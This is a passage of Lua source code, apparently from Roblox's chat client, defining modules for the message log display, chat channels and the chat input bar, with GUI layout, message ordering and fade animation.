			obj.CurrentChannel = nil
		
			obj.Visible = true
			obj.CoreGuiEnabled = true
		
			obj.AnimParams = {}
		
			obj:InitializeAnimParams()
		
			return obj
		end
		
		return module
		
	end[message_log_display] = function()
		--	// FileName: MessageLogDisplay.lua
		--	// Written by: Xsitsu, TheGamer101
		--	// Description: ChatChannel window for displaying messages.
		
		local module = {}
		module.ScrollBarThickness = 4
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		local moduleMessageLabelCreator = require(modulesFolder:WaitForChild("MessageLabelCreator"))
		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		
		local MessageLabelCreator = moduleMessageLabelCreator.new()
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		local function CreateGuiObjects()
			local BaseFrame = Instance.new("Frame")
			BaseFrame.Selectable = false
			BaseFrame.Size = UDim2.new(1, 0, 1, 0)
			BaseFrame.BackgroundTransparency = 1
		
			local Scroller = Instance.new("ScrollingFrame")
			Scroller.Selectable = ChatSettings.GamepadNavigationEnabled
			Scroller.Name = "Scroller"
			Scroller.BackgroundTransparency = 1
			Scroller.BorderSizePixel = 0
			Scroller.Position = UDim2.new(0, 0, 0, 3)
			Scroller.Size = UDim2.new(1, -4, 1, -6)
			Scroller.CanvasSize = UDim2.new(0, 0, 0, 0)
			Scroller.ScrollBarThickness = module.ScrollBarThickness
			Scroller.Active = true
			Scroller.Parent = BaseFrame
		
			local Layout = Instance.new("UIListLayout")
			Layout.SortOrder = Enum.SortOrder.LayoutOrder
			Layout.Parent = Scroller
		
			return BaseFrame, Scroller, Layout
		end
		
		function methods:Destroy()
			self.GuiObject:Destroy()
			self.Destroyed = true
		end
		
		function methods:SetActive(active)
			self.GuiObject.Visible = active
		end
		
		function methods:UpdateMessageFiltered(messageData)
			local messageObject = nil
			local searchIndex = 1
			local searchTable = self.MessageObjectLog
		
			while (#searchTable >= searchIndex) do
				local obj = searchTable[searchIndex]
		
				if obj.ID == messageData.ID then
					messageObject = obj
					break
				end
		
				searchIndex = searchIndex + 1
			end
		
			if messageObject then
				messageObject.UpdateTextFunction(messageData)
				self:PositionMessageLabelInWindow(messageObject, searchIndex)
			end
		end
		
		function methods:AddMessage(messageData)
			self:WaitUntilParentedCorrectly()
		
			local messageObject = MessageLabelCreator:CreateMessageLabel(messageData, self.CurrentChannelName)
			if messageObject == nil then
				return
			end
		
			table.insert(self.MessageObjectLog, messageObject)
			self:PositionMessageLabelInWindow(messageObject, #self.MessageObjectLog)
		end
		
		function methods:AddMessageAtIndex(messageData, index)
			local messageObject = MessageLabelCreator:CreateMessageLabel(messageData, self.CurrentChannelName)
			if messageObject == nil then
				return
			end
		
			table.insert(self.MessageObjectLog, index, messageObject)
		
			self:PositionMessageLabelInWindow(messageObject, index)
		end
		
		function methods:RemoveLastMessage()
			self:WaitUntilParentedCorrectly()
		
			local lastMessage = self.MessageObjectLog[1]
		
			lastMessage:Destroy()
			table.remove(self.MessageObjectLog, 1)
		end
		
		function methods:IsScrolledDown()
			local yCanvasSize = self.Scroller.CanvasSize.Y.Offset
			local yContainerSize = self.Scroller.AbsoluteWindowSize.Y
			local yScrolledPosition = self.Scroller.CanvasPosition.Y
		
			return (yCanvasSize < yContainerSize or
				yCanvasSize - yScrolledPosition <= yContainerSize + 5)
		end
		
		function methods:UpdateMessageTextHeight(messageObject)
			local baseFrame = messageObject.BaseFrame
			for i = 1, 10 do
				if messageObject.BaseMessage.TextFits then
					break
				end
		
				local trySize = self.Scroller.AbsoluteSize.X - i
				baseFrame.Size = UDim2.new(1, 0, 0, messageObject.GetHeightFunction(trySize))
			end
		end
		
		function methods:PositionMessageLabelInWindow(messageObject, index)
			self:WaitUntilParentedCorrectly()
		
			local wasScrolledDown = self:IsScrolledDown()
		
			local baseFrame = messageObject.BaseFrame
		
			local layoutOrder = 1
			if self.MessageObjectLog[index - 1] then
				if index == #self.MessageObjectLog then
					layoutOrder = self.MessageObjectLog[index - 1].BaseFrame.LayoutOrder + 1
				else
					layoutOrder = self.MessageObjectLog[index - 1].BaseFrame.LayoutOrder
				end
			end
			baseFrame.LayoutOrder = layoutOrder
		
			baseFrame.Size = UDim2.new(1, 0, 0, messageObject.GetHeightFunction(self.Scroller.AbsoluteSize.X))
			baseFrame.Parent = self.Scroller
		
			if messageObject.BaseMessage then
				self:UpdateMessageTextHeight(messageObject)
			end
		
			if wasScrolledDown then
				self.Scroller.CanvasPosition = Vector2.new(
					0, math.max(0, self.Scroller.CanvasSize.Y.Offset - self.Scroller.AbsoluteSize.Y))
			end
		end
		
		function methods:ReorderAllMessages()
			self:WaitUntilParentedCorrectly()
		
			--// Reordering / reparenting with a size less than 1 causes weird glitches to happen
			-- with scrolling as repositioning happens.
			if self.GuiObject.AbsoluteSize.Y < 1 then return end
		
			local oldCanvasPositon = self.Scroller.CanvasPosition
			local wasScrolledDown = self:IsScrolledDown()
		
			for _, messageObject in pairs(self.MessageObjectLog) do
				self:UpdateMessageTextHeight(messageObject)
			end
		
			if not wasScrolledDown then
				self.Scroller.CanvasPosition = oldCanvasPositon
			else
				self.Scroller.CanvasPosition = Vector2.new(
					0, math.max(0, self.Scroller.CanvasSize.Y.Offset - self.Scroller.AbsoluteSize.Y))
			end
		end
		
		function methods:Clear()
			for _, v in pairs(self.MessageObjectLog) do
				v:Destroy()
			end
			self.MessageObjectLog = {}
		end
		
		function methods:SetCurrentChannelName(name)
			self.CurrentChannelName = name
		end
		
		function methods:FadeOutBackground(duration)
			--// Do nothing
		end
		
		function methods:FadeInBackground(duration)
			--// Do nothing
		end
		
		function methods:FadeOutText(duration)
			for i = 1, #self.MessageObjectLog do
				if self.MessageObjectLog[i].FadeOutFunction then
					self.MessageObjectLog[i].FadeOutFunction(duration, CurveUtil)
				end
			end
		end
		
		function methods:FadeInText(duration)
			for i = 1, #self.MessageObjectLog do
				if self.MessageObjectLog[i].FadeInFunction then
					self.MessageObjectLog[i].FadeInFunction(duration, CurveUtil)
				end
			end
		end
		
		function methods:Update(dtScale)
			for i = 1, #self.MessageObjectLog do
				if self.MessageObjectLog[i].UpdateAnimFunction then
					self.MessageObjectLog[i].UpdateAnimFunction(dtScale, CurveUtil)
				end
			end
		end
		
		--// ToDo: Move to common modules
		function methods:WaitUntilParentedCorrectly()
			while (not self.GuiObject:IsDescendantOf(game:GetService("Players").LocalPlayer)) do
				self.GuiObject.AncestryChanged:wait()
			end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
			obj.Destroyed = false
		
			local BaseFrame, Scroller, Layout = CreateGuiObjects()
			obj.GuiObject = BaseFrame
			obj.Scroller = Scroller
			obj.Layout = Layout
		
			obj.MessageObjectLog = {}
		
			obj.Name = "MessageLogDisplay"
			obj.GuiObject.Name = "Frame_" .. obj.Name
		
			obj.CurrentChannelName = ""
		
			obj.GuiObject:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
				spawn(function() obj:ReorderAllMessages() end)
			end)
		
			local wasScrolledDown = true
		
			obj.Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
				local size = obj.Layout.AbsoluteContentSize
				obj.Scroller.CanvasSize = UDim2.new(0, 0, 0, size.Y)
				if wasScrolledDown then
					local windowSize = obj.Scroller.AbsoluteWindowSize
					obj.Scroller.CanvasPosition = Vector2.new(0, size.Y - windowSize.Y)
				end
			end)
		
			obj.Scroller:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
				wasScrolledDown = obj:IsScrolledDown()
			end)
		
			return obj
		end
		
		return module
		
	end[chatchannel] = function()
		--	// FileName: ChatChannel.lua
		--	// Written by: Xsitsu
		--	// Description: ChatChannel class for handling messages being added and removed from the chat channel.
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:Destroy()
			self.Destroyed = true
		end
		
		function methods:SetActive(active)
			if active == self.Active then
				return
			end
			if active == false then
				self.MessageLogDisplay:Clear()
			else
				self.MessageLogDisplay:SetCurrentChannelName(self.Name)
				for i = 1, #self.MessageLog do
					self.MessageLogDisplay:AddMessage(self.MessageLog[i])
				end
			end
			self.Active = active
		end
		
		function methods:UpdateMessageFiltered(messageData)
			local searchIndex = 1
			local searchTable = self.MessageLog
			local messageObj = nil
			while (#searchTable >= searchIndex) do
				local obj = searchTable[searchIndex]
		
				if (obj.ID == messageData.ID) then
					messageObj = obj
					break
				end
		
				searchIndex = searchIndex + 1
			end
		
			if messageObj then
				messageObj.Message = messageData.Message
				messageObj.IsFiltered = true
				if self.Active then
					self.MessageLogDisplay:UpdateMessageFiltered(messageObj)
				end
			else
				-- We have not seen this filtered message before, but we should still add it to our log.
				self:AddMessageToChannelByTimeStamp(messageData)
			end
		end
		
		function methods:AddMessageToChannel(messageData)
			table.insert(self.MessageLog, messageData)
			if self.Active then
				self.MessageLogDisplay:AddMessage(messageData)
			end
			if #self.MessageLog > ChatSettings.MessageHistoryLengthPerChannel then
				self:RemoveLastMessageFromChannel()
			end
		end
		
		function methods:InternalAddMessageAtTimeStamp(messageData)
			for i = 1, #self.MessageLog do
				if messageData.Time < self.MessageLog[i].Time then
					table.insert(self.MessageLog, i, messageData)
					return
				end
			end
			table.insert(self.MessageLog, messageData)
		end
		
		function methods:AddMessagesToChannelByTimeStamp(messageLog, startIndex)
			for i = startIndex, #messageLog do
				self:InternalAddMessageAtTimeStamp(messageLog[i])
			end
			while #self.MessageLog > ChatSettings.MessageHistoryLengthPerChannel do
				table.remove(self.MessageLog, 1)
			end
			if self.Active then
				self.MessageLogDisplay:Clear()
				for i = 1, #self.MessageLog do
					self.MessageLogDisplay:AddMessage(self.MessageLog[i])
				end
			end
		end
		
		function methods:AddMessageToChannelByTimeStamp(messageData)
			if #self.MessageLog >= 1 then
				-- These are the fast cases to evalutate.
				if self.MessageLog[1].Time > messageData.Time then
					return
				elseif messageData.Time >= self.MessageLog[#self.MessageLog].Time then
					self:AddMessageToChannel(messageData)
					return
				end
		
				for i = 1, #self.MessageLog do
					if messageData.Time < self.MessageLog[i].Time then
						table.insert(self.MessageLog, i, messageData)
		
						if #self.MessageLog > ChatSettings.MessageHistoryLengthPerChannel then
							self:RemoveLastMessageFromChannel()
						end
		
						if self.Active then
							self.MessageLogDisplay:AddMessageAtIndex(messageData, i)
						end
		
						return
					end
				end
			else
				self:AddMessageToChannel(messageData)
			end
		end
		
		function methods:RemoveLastMessageFromChannel()
			table.remove(self.MessageLog, 1)
		
			if self.Active then
				self.MessageLogDisplay:RemoveLastMessage()
			end
		end
		
		function methods:ClearMessageLog()
			self.MessageLog = {}
		
			if self.Active then
				self.MessageLogDisplay:Clear()
			end
		end
		
		function methods:RegisterChannelTab(tab)
			self.ChannelTab = tab
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(channelName, messageLogDisplay)
			local obj = setmetatable({}, methods)
			obj.Destroyed = false
			obj.Active = false
		
			obj.MessageLog = {}
			obj.MessageLogDisplay = messageLogDisplay
			obj.ChannelTab = nil
			obj.Name = channelName
		
			return obj
		end
		
		return module
		
	end[chat_bar] = function()
		--	// FileName: ChatBar.lua
		--	// Written by: Xsitsu
		--	// Description: Manages text typing and typing state.
		
		local module = {}
		
		local UserInputService = game:GetService("UserInputService")
		local RunService = game:GetService("RunService")
		local Players = game:GetService("Players")
		local TextService = game:GetService("TextService")
		local LocalPlayer = Players.LocalPlayer
		
		while not LocalPlayer do
			Players.PlayerAdded:wait()
			LocalPlayer = Players.LocalPlayer
		end
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
		local CurveUtil = require(modulesFolder:WaitForChild("CurveUtil"))
		
		local commandModules = clientChatModules:WaitForChild("CommandModules")
		local WhisperModule = require(commandModules:WaitForChild("Whisper"))
		
		local MessageSender = require(modulesFolder:WaitForChild("MessageSender"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} function ChatLocalization:Get(key,default) return default end end
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:CreateGuiObjects(targetParent)
			self.ChatBarParentFrame = targetParent
		
			local backgroundImagePixelOffset = 7
			local textBoxPixelOffset = 5
		
			local BaseFrame = Instance.new("Frame")
			BaseFrame.Selectable = false
			BaseFrame.Size = UDim2.new(1, 0, 1, 0)
			BaseFrame.BackgroundTransparency = 0.6
			BaseFrame.BorderSizePixel = 0
			BaseFrame.BackgroundColor3 = ChatSettings.ChatBarBackGroundColor
			BaseFrame.Parent = targetParent
		
			local BoxFrame = Instance.new("Frame")
			BoxFrame.Selectable = false
			BoxFrame.Name = "BoxFrame"
			BoxFrame.BackgroundTransparency = 0.6
			BoxFrame.BorderSizePixel = 0
			BoxFrame.BackgroundColor3 = ChatSettings.ChatBarBoxColor
			BoxFrame.Size = UDim2.new(1, -backgroundImagePixelOffset * 2, 1, -backgroundImagePixelOffset * 2)
			BoxFrame.Position = UDim2.new(0, backgroundImagePixelOffset, 0, backgroundImagePixelOffset)
			BoxFrame.Parent = BaseFrame
		
			local TextBoxHolderFrame = Instance.new("Frame")
			TextBoxHolderFrame.BackgroundTransparency = 1
			TextBoxHolderFrame.Size = UDim2.new(1, -textBoxPixelOffset * 2, 1, -textBoxPixelOffset * 2)
			TextBoxHolderFrame.Position = UDim2.new(0, textBoxPixelOffset, 0, textBoxPixelOffset)
			TextBoxHolderFrame.Parent = BoxFrame
		
			local TextBox = Instance.new("TextBox")
			TextBox.Selectable = ChatSettings.GamepadNavigationEnabled
			TextBox.Name = "ChatBar"
			TextBox.BackgroundTransparency = 1
			TextBox.Size = UDim2.new(1, 0, 1, 0)
			TextBox.Position = UDim2.new(0, 0, 0, 0)
			TextBox.TextSize = ChatSettings.ChatBarTextSize
			TextBox.Font = ChatSettings.ChatBarFont
			TextBox.TextColor3 = ChatSettings.ChatBarTextColor
			TextBox.TextTransparency = 0.4
			TextBox.TextStrokeTransparency = 1
			TextBox.ClearTextOnFocus = false
			TextBox.TextXAlignment = Enum.TextXAlignment.Left
			TextBox.TextYAlignment = Enum.TextYAlignment.Top
			TextBox.TextWrapped = true
			TextBox.Text = ""
			TextBox.Parent = TextBoxHolderFrame
		
			local MessageModeTextButton = Instance.new("TextButton")
			MessageModeTextButton.Selectable = false
			MessageModeTextButton.Name = "MessageMode"
			MessageModeTextButton.BackgroundTransparency = 1
			MessageModeTextButton.Position = UDim2.new(0, 0, 0, 0)
			MessageModeTextButton.TextSize = ChatSettings.ChatBarTextSize
			MessageModeTextButton.Font = ChatSettings.ChatBarFont
			MessageModeTextButton.TextXAlignment = Enum.TextXAlignment.Left
			MessageModeTextButton.TextWrapped = true
			MessageModeTextButton.Text = ""
			MessageModeTextButton.Size = UDim2.new(0, 0, 0, 0)
			MessageModeTextButton.TextYAlignment = Enum.TextYAlignment.Center
			MessageModeTextButton.TextColor3 = self:GetDefaultChannelNameColor()
			MessageModeTextButton.Visible = true
			MessageModeTextButton.Parent = TextBoxHolderFrame
		
			local TextLabel = Instance.new("TextLabel")
			TextLabel.Selectable = false
			TextLabel.TextWrapped = true
			TextLabel.BackgroundTransparency = 1
			TextLabel.Size = TextBox.Size
			TextLabel.Position = TextBox.Position
			TextLabel.TextSize = TextBox.TextSize
			TextLabel.Font = TextBox.Font
			TextLabel.TextColor3 = TextBox.TextColor3
			TextLabel.TextTransparency = TextBox.TextTransparency
			TextLabel.TextStrokeTransparency = TextBox.TextStrokeTransparency
			TextLabel.TextXAlignment = TextBox.TextXAlignment
			TextLabel.TextYAlignment = TextBox.TextYAlignment
			TextLabel.Text = "..."
			TextLabel.Parent = TextBoxHolderFrame
		
			self.GuiObject = BaseFrame
			self.TextBox = TextBox
			self.TextLabel  = TextLabel
		
			self.GuiObjects.BaseFrame = BaseFrame
			self.GuiObjects.TextBoxFrame = BoxFrame
			self.GuiObjects.TextBox = TextBox
			self.GuiObjects.TextLabel = TextLabel
			self.GuiObjects.MessageModeTextButton = MessageModeTextButton
		
			self:AnimGuiObjects()
			self:SetUpTextBoxEvents(TextBox, TextLabel, MessageModeTextButton)
			if self.UserHasChatOff then
				self:DoLockChatBar()
			end
			self.eGuiObjectsChanged:Fire()
		end
		
		-- Used to lock the chat bar when the user has chat turned off.
		function methods:DoLockChatBar()
			if self.TextLabel then
				if LocalPlayer.UserId > 0 then
					self.TextLabel.Text = ChatLocalization:Get(
						"GameChat_ChatMessageValidator_SettingsError",
						"To chat in game, turn on chat in your Privacy Settings."
					)
				else
					self.TextLabel.Text = ChatLocalization:Get(
						"GameChat_SwallowGuestChat_Message",
						"Sign up to chat in game."
					)
				end
				self:CalculateSize()
			end
			if self.TextBox then
				self.TextBox.Active = false
				self.TextBox.Focused:connect(function()
					self.TextBox:ReleaseFocus()
				end)
			end
		end
		
		function methods:SetUpTextBoxEvents(TextBox, TextLabel, MessageModeTextButton)
			-- Clean up events from a previous setup.
			for name, conn in pairs(self.TextBoxConnections) do
				conn:disconnect()
				self.TextBoxConnections[name] = nil
			end
		
			--// Code for getting back into general channel from other target channel when pressing backspace.
			self.TextBoxConnections.UserInputBegan = UserInputService.InputBegan:connect(function(inputObj, gpe)
				if (inputObj.KeyCode == Enum.KeyCode.Backspace) then
					if (self:IsFocused() and TextBox.Text == "") then
						self:SetChannelTarget(ChatSettings.GeneralChannelName)
					end
				end
			end)
		
			self.TextBoxConnections.TextBoxChanged = TextBox.Changed:connect(function(prop)
				if prop == "AbsoluteSize" then
					self:CalculateSize()
					return
				end
		
				if prop ~= "Text" then
					return
				end
		
				self:CalculateSize()
		
				if utf8.len(utf8.nfcnormalize(TextBox.Text)) > ChatSettings.MaximumMessageLength then
					TextBox.Text = self.PreviousText
				else
					self.PreviousText = TextBox.Text
				end
		
				if not self.InCustomState then
					local customState = self.CommandProcessor:ProcessInProgressChatMessage(TextBox.Text, self.ChatWindow, self)
					if customState then
						self.InCustomState = true
						self.CustomState = customState
					end
				else
					self.CustomState:TextUpdated()
				end
			end)
		
			local function UpdateOnFocusStatusChanged(isFocused)
				if isFocused or TextBox.Text ~= "" then
					TextLabel.Visible = false
				else
					TextLabel.Visible = true
				end
			end
		
			self.TextBoxConnections.MessageModeClick = MessageModeTextButton.MouseButton1Click:connect(function()
				if MessageModeTextButton.Text ~= "" then
					self:SetChannelTarget(ChatSettings.GeneralChannelName)
				end
			end)
		
			self.TextBoxConnections.TextBoxFocused = TextBox.Focused:connect(function()
				if not self.UserHasChatOff then
					self:CalculateSize()
					UpdateOnFocusStatusChanged(true)
				end
			end)
		
			self.TextBoxConnections.TextBoxFocusLost = TextBox.FocusLost:connect(function(enterPressed, inputObject)
				self:CalculateSize()
				if (inputObject and inputObject.KeyCode == Enum.KeyCode.Escape) then
					TextBox.Text = ""
				end
				UpdateOnFocusStatusChanged(false)
			end)
		end
		
		function methods:GetTextBox()
			return self.TextBox
		end
		
		function methods:GetMessageModeTextButton()
			return self.GuiObjects.MessageModeTextButton
		end
		
		-- Deprecated in favour of GetMessageModeTextButton
		-- Retained for compatibility reasons.
		function methods:GetMessageModeTextLabel()
			return self:GetMessageModeTextButton()
		end
		
		function methods:IsFocused()
			if self.UserHasChatOff then
				return false
			end
		
			return self:GetTextBox():IsFocused()
		end
		
		function methods:GetVisible()
			return self.GuiObject.Visible
		end
		
		function methods:CaptureFocus()
			if not self.UserHasChatOff then
				self:GetTextBox():CaptureFocus()
			end
		end
		
		function methods:ReleaseFocus(didRelease)
			self:GetTextBox():ReleaseFocus(didRelease)
		end
		
		function methods:ResetText()
			self:GetTextBox().Text = ""
		end
		
		function methods:SetText(text)
			self:GetTextBox().Text = text
		end
		
		function methods:GetEnabled()
			return self.GuiObject.Visible
		end
		
		function methods:SetEnabled(enabled)
			if self.UserHasChatOff then
				-- The chat bar can not be removed if a user has chat turned off so that
				-- the chat bar can display a message explaining that chat is turned off.
				self.GuiObject.Visible = true
			else
				self.GuiObject.Visible = enabled
			end
		end
		
		function methods:SetTextLabelText(text)
			if not self.UserHasChatOff then
				self.TextLabel.Text = text
			end
		end
		
		function methods:SetTextBoxText(text)
			self.TextBox.Text = text
		end
		
		function methods:GetTextBoxText()
			return self.TextBox.Text
		end
		
		function methods:ResetSize()
			self.TargetYSize = 0
			self:TweenToTargetYSize()
		end
		
		local function measureSize(textObj)
			return TextService:GetTextSize(
				textObj.Text,
				textObj.TextSize,
				textObj.Font,
				Vector2.new(textObj.AbsoluteSize.X, 10000)
			)
		end
		
		function methods:CalculateSize()
			if self.CalculatingSizeLock then
				return
			end
			self.CalculatingSizeLock = true
		
			local textSize = nil
			local bounds = nil
		
			if self:IsFocused() or self.TextBox.Text ~= "" then
				textSize = self.TextBox.TextSize
				bounds = measureSize(self.TextBox).Y
			else
				textSize = self.TextLabel.TextSize
				bounds = measureSize(self.TextLabel).Y
			end
		
			local newTargetYSize = bounds - textSize
			if (self.TargetYSize ~= newTargetYSize) then
				self.TargetYSize = newTargetYSize
				self:TweenToTargetYSize()
			end
		
			self.CalculatingSizeLock = false
		end
		
		function methods:TweenToTargetYSize()
			local endSize = UDim2.new(1, 0, 1, self.TargetYSize)
			local curSize = self.GuiObject.Size
		
			local curAbsoluteSizeY = self.GuiObject.AbsoluteSize.Y
			self.GuiObject.Size = endSize
			local endAbsoluteSizeY = self.GuiObject.AbsoluteSize.Y
			self.GuiObject.Size = curSize
		
			local pixelDistance = math.abs(endAbsoluteSizeY - curAbsoluteSizeY)
			local tweeningTime = math.min(1, (pixelDistance * (1 / self.TweenPixelsPerSecond))) -- pixelDistance * (seconds per pixels)
		
			local success = pcall(function() self.GuiObject:TweenSize(endSize, Enum.EasingDirection.Out, Enum.EasingStyle.Quad, tweeningTime, true) end)
			if (not success) then
				self.GuiObject.Size = endSize
			end
		end
		
		function methods:SetTextSize(textSize)
			if not self:IsInCustomState() then
				if self.TextBox then
					self.TextBox.TextSize = textSize
				end
				if self.TextLabel then
					self.TextLabel.TextSize = textSize
				end
			end
		end
		
		function methods:GetDefaultChannelNameColor()
			if ChatSettings.DefaultChannelNameColor then
				return ChatSettings.DefaultChannelNameColor
			end
			return Color3.fromRGB(35, 76, 142)
		end
		
		function methods:SetChannelTarget(targetChannel)
			local messageModeTextButton = self.GuiObjects.MessageModeTextButton
			local textBox = self.TextBox
			local textLabel = self.TextLabel
		
			self.TargetChannel = targetChannel
		
			if not self:IsInCustomState() then
				if targetChannel ~= ChatSettings.GeneralChannelName then
					messageModeTextButton.Size = UDim2.new(0, 1000, 1, 0)
					local localizedTargetChannel = targetChannel
					if ChatLocalization.tryLocalize then
						localizedTargetChannel = ChatLocalization:tryLocalize(targetChannel)
					end
					messageModeTextButton.Text = string.format("[%s] ", localizedTargetChannel)
		
					local channelNameColor = self:GetChannelNameColor(targetChannel)
					if channelNameColor then
						messageModeTextButton.TextColor3 = channelNameColor
					else
						messageModeTextButton.TextColor3 = self:GetDefaultChannelNameColor()
					end
		
					local xSize = messageModeTextButton.TextBounds.X
					messageModeTextButton.Size = UDim2.new(0, xSize, 1, 0)
					textBox.Size = UDim2.new(1, -xSize, 1, 0)
					textBox.Position = UDim2.new(0, xSize, 0, 0)
					textLabel.Size = UDim2.new(1, -xSize, 1, 0)
					textLabel.Position = UDim2.new(0, xSize, 0, 0)
				else
					messageModeTextButton.Text = ""
					messageModeTextButton.Size = UDim2.new(0, 0, 0, 0)
					textBox.Size = UDim2.new(1, 0, 1, 0)
					textBox.Position = UDim2.new(0, 0, 0, 0)
					textLabel.Size = UDim2.new(1, 0, 1, 0)
					textLabel.Position = UDim2.new(0, 0, 0, 0)
				end
			end
		end
		
		function methods:IsInCustomState()
			return self.InCustomState
		end
		
		function methods:ResetCustomState()
			if self.InCustomState then
				self.CustomState:Destroy()
				self.CustomState = nil
				self.InCustomState = false
		
				self.ChatBarParentFrame:ClearAllChildren()
				self:CreateGuiObjects(self.ChatBarParentFrame)
				self:SetTextLabelText(
					ChatLocalization:Get(
						"GameChat_ChatMain_ChatBarText",
						'To chat click here or press "/" key'
					)
				)
			end
		end
		
		function methods:EnterWhisperState(player)
			self:ResetCustomState()
			if WhisperModule.CustomStateCreator then
				self.CustomState = WhisperModule.CustomStateCreator(
					player,
					self.ChatWindow,
					self,
					ChatSettings
				)
				self.InCustomState = true
			else
				local playerName
		
				if ChatSettings.PlayerDisplayNamesEnabled then
					playerName = player.DisplayName
				else
					playerName = player.Name
				end
		
				self:SetText("/w " .. playerName)
			end
			self:CaptureFocus()
		end
		
		function methods:GetCustomMessage()
			if self.InCustomState then
				return self.CustomState:GetMessage()
			end
			return nil
		end
		
		function methods:CustomStateProcessCompletedMessage(message)
			if self.InCustomState then
				return self.CustomState:ProcessCompletedMessage()
			end
			return false
		end
		
		function methods:FadeOutBackground(duration)
			self.AnimParams.Background_TargetTransparency = 1
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
			self:FadeOutText(duration)
		end
		
		function methods:FadeInBackground(duration)
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
			self:FadeInText(duration)
		end
		
		function methods:FadeOutText(duration)
			self.AnimParams.Text_TargetTransparency = 1
			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:FadeInText(duration)
			self.AnimParams.Text_TargetTransparency = 0.4
			self.AnimParams.Text_NormalizedExptValue = CurveUtil:NormalizedDefaultExptValueInSeconds(duration)
		end
		
		function methods:AnimGuiObjects()
			self.GuiObject.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
			self.GuiObjects.TextBoxFrame.BackgroundTransparency = self.AnimParams.Background_CurrentTransparency
		
			self.GuiObjects.TextLabel.TextTransparency = self.AnimParams.Text_CurrentTransparency
			self.GuiObjects.TextBox.TextTransparency = self.AnimParams.Text_CurrentTransparency
			self.GuiObjects.MessageModeTextButton.TextTransparency = self.AnimParams.Text_CurrentTransparency
		end
		
		function methods:InitializeAnimParams()
			self.AnimParams.Text_TargetTransparency = 0.4
			self.AnimParams.Text_CurrentTransparency = 0.4
			self.AnimParams.Text_NormalizedExptValue = 1
		
			self.AnimParams.Background_TargetTransparency = 0.6
			self.AnimParams.Background_CurrentTransparency = 0.6
			self.AnimParams.Background_NormalizedExptValue = 1
		end
		
		function methods:Update(dtScale)
			self.AnimParams.Text_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Text_CurrentTransparency,
					self.AnimParams.Text_TargetTransparency,
					self.AnimParams.Text_NormalizedExptValue,
					dtScale
			)
			self.AnimParams.Background_CurrentTransparency = CurveUtil:Expt(
					self.AnimParams.Background_CurrentTransparency,
					self.AnimParams.Background_TargetTransparency,
					self.AnimParams.Background_NormalizedExptValue,
					dtScale
			)
		
			self:AnimGuiObjects()
		end
		
		function methods:SetChannelNameColor(channelName, channelNameColor)
			self.ChannelNameColors[channelName] = channelNameColor
			if self.GuiObjects.MessageModeTextButton.Text == channelName then
				self.GuiObjects.MessageModeTextButton.TextColor3 = channelNameColor
			end
		end
		
		function methods:GetChannelNameColor(channelName)
			return self.ChannelNameColors[channelName]
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(CommandProcessor, ChatWindow)
			local obj = setmetatable({}, methods)
		
			obj.GuiObject = nil
			obj.ChatBarParentFrame = nil
			obj.TextBox = nil
			obj.TextLabel = nil
			obj.GuiObjects = {}
			obj.eGuiObjectsChanged = Instance.new("BindableEvent")
			obj.GuiObjectsChanged = obj.eGuiObjectsChanged.Event
			obj.TextBoxConnections = {}
			obj.PreviousText = ""
		
			obj.InCustomState = false
			obj.CustomState = nil
		
			obj.TargetChannel = nil
			obj.CommandProcessor = CommandProcessor
			obj.ChatWindow = ChatWindow
		
			obj.TweenPixelsPerSecond = 500
			obj.TargetYSize = 0
		
			obj.AnimParams = {}
			obj.CalculatingSizeLock = false
		
			obj.ChannelNameColors = {}
		
			obj.UserHasChatOff = false
		
			obj:InitializeAnimParams()
		
			ChatSettings.SettingsChanged:connect(function(setting, value)
				if (setting == "ChatBarTextSize") then
					obj:SetTextSize(value)
				end
			end)
		
			coroutine.wrap(function()
				local success, canLocalUserChat = pcall(function()
					return Chat:CanUserChatAsync(LocalPlayer.UserId)
				end)
				local canChat = success and (RunService:IsStudio() or canLocalUserChat)
				if canChat == false then
					obj.UserHasChatOff = true
					obj:DoLockChatBar()
				end
			end)()
		
		
			return obj
		end
		
		return module
		
	end[channels_bar] = function()
		--	// FileName: ChannelsBar.lua
		--	// Written by: Xsitsu
		--	// Description: Manages creating, destroying, and displaying ChannelTabs.
		
		local module = {}
		
		local PlayerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
		
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
